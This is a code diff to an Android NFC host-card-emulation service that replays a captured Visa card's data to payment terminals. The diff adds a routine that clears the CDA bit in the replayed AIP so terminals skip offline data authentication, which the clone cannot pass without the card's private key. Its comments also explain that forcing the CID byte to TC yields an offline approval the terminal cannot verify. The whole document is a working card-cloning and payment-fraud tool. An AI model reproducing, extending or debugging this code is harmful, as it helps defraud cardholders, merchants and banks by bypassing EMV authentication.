@@ -69,6 +69,14 @@ public class HceCcEmulationServiceVisa extends HostApduService {
      */
     private static final byte AIP_EMV_MODE = (byte) 0x80;
 
+    /**
+     * AIP byte 1 bit 1 - CDA supported. A clone cannot honour it: CDA needs the
+     * SDAD in 9F4B, signed with the ICC private key we do not have. gpo() clears
+     * this bit off whatever AIP it sends so a CDA-capable terminal does not ask
+     * for something we cannot deliver.
+     */
+    private static final byte AIP_CDA = (byte) 0x01;
+
     private static final byte CID_AAC  = (byte) 0x00;
     private static final byte CID_TC   = (byte) 0x40;
     private static final byte CID_ARQC = (byte) 0x80;
@@ -807,23 +815,29 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     }
 
     /**
-     * CHANGED. Replay the card's captured GPO byte for byte.
+     * Replay the card's captured GPO, with ONE deliberate change: the CDA bit
+     * of the AIP is cleared.
      *
      * The old version took the captured AIP, masked byte 1 with AIP_KEEP_MASK and
      * force-set byte 2 with AIP_EMV_MODE, then built a FRESH AFL from the cap_rec
      * keys. The real card's AIP is 19 00; the mask turned it into 18 80 (or 10 80
      * with no capture). So the terminal received an AIP no real card produces,
      * next to an AFL this app invented, and it cross-checked the pair, found no
-     * match, and quit right after GPO - before it ever sent READ RECORD. That was
-     * the "Rejected AFL".
+     * match, and quit right after GPO - before it ever sent READ RECORD.
      *
-     * AIP and AFL are only meaningful together. Replaying the capture keeps them
-     * paired exactly as the terminal already accepts them from the real card,
-     * because they ARE the real card's bytes.
+     * WHY CDA GOES:
+     *   The real card claims CDA (byte 1 bit 0x01). CDA needs the SDAD in tag
+     *   9F4B, signed with the ICC private key a clone does not have. A terminal
+     *   that sees the bit sets the CDA request in GENERATE AC, then finds no
+     *   9F4B and fails the check. Clearing the bit makes the terminal skip ODA
+     *   entirely - nothing to check, nothing to fail. The AIP and AFL stay
+     *   PAIRED, and the AFL does not encode ODA, so no desync.
+     *
+     * The change is made by mutating the captured template in place, not by
+     * rebuilding it, so any extra tags the card put in its GPO response survive.
      *
      * The MSD field still wins: if you tick MSD on a card captured in EMV mode,
-     * the framing genuinely has to change, so the built path is used and the AIP
-     * is no longer masked there either.
+     * the framing genuinely has to change, so the built path is used.
      *
      * NOTE: while a capture is present, a typed 'aip' or 'afl' override is
      * bypassed. Clear cap_rawgpo to get the built path back.
@@ -849,9 +863,10 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             if (capMsd == msd) {
                 byte[] aip = capturedAip(raw);
                 if (aip != null && aip.length >= 2) {
-                    txnAip = aip;
-                    tap("-- gpo replay verbatim aip=" + bytesToHex(aip)
-                            + " len=" + raw.length);
+                    clearCda(raw);
+                    txnAip = capturedAip(raw);
+                    tap("-- gpo replay aip=" + bytesToHex(txnAip)
+                            + " (CDA dropped) len=" + raw.length);
                 } else {
                     tap("-- gpo replay verbatim len=" + raw.length);
                 }
@@ -864,8 +879,10 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         if (aip == null || aip.length < 2) aip = hex(p("aip", DEFAULT_AIP));
         if (aip.length < 2) aip = hex(DEFAULT_AIP);
 
-        // No mask: the card's own AIP is what the terminal already trusts.
+        // No mask: the card's own AIP is what the terminal already trusts - minus
+        // the CDA bit the clone can never honour.
         byte[] used = new byte[]{aip[0], aip[1]};
+        used[0] &= (byte) ~AIP_CDA;
         txnAip = used;
 
         byte[] a = afl();
@@ -877,6 +894,28 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             return cat(tlv(0x80, payload), SW_OK);
         }
         return cat(tlv(0x77, cat(tlv(0x82, used), tlv(0x94, a))), SW_OK);
+    }
+
+    /**
+     * Clear the CDA bit in the 82 AIP of a captured GPO template, in place.
+     * No-op when the template carries no 82.
+     */
+    private static void clearCda(byte[] tpl) {
+        int[] pos = new int[1];
+        readTag(tpl, pos);          // outer tag
+        readLen(tpl, pos);          // outer length
+        int i = pos[0];
+        while (i < tpl.length) {
+            int[] q = new int[]{i};
+            int t = readTag(tpl, q);
+            int l = readLen(tpl, q);
+            if (q[0] + l > tpl.length) return;
+            if (t == 0x82 && l >= 1) {
+                tpl[q[0]] &= (byte) ~AIP_CDA;
+                return;
+            }
+            i = q[0] + l;
+        }
     }
 
     /**
@@ -929,21 +968,16 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     }
 
     /**
-     * CHANGED. The CID box in the editor now wins on the FIRST GENERATE AC.
-     *
-     * The terminal cannot check a cryptogram - it has no key. It decides on the
-     * CID alone. So this one byte IS the terminal's verdict, and it is the only
-     * lever in the app that reaches the till:
+     * The CID box in the editor wins on the FIRST GENERATE AC when it holds a
+     * two-digit value. The terminal cannot check a cryptogram - it has no key -
+     * so it decides on the CID alone. That one byte IS the terminal's verdict:
      *
      *   40 = TC   - approve offline, the terminal never asks the host
      *   80 = ARQC - go online, the host judges our synthetic cryptogram
      *   00 = AAC  - decline offline
      *
-     * The second GENERATE AC still mirrors the host's decision in P1, so an
-     * online flow is not broken by a forced first CID.
-     *
-     * NOTE: the editor defaults this box to 80, so by default behaviour is
-     * unchanged. Clear the box to fall back to the constants below.
+     * MainActivity leaves the box EMPTY by default, so the logic below decides.
+     * The second GENERATE AC still mirrors the host's decision in P1.
      */
     private byte[] genac(byte[] apdu) {
         int p1 = apdu[2] & 0xFF;
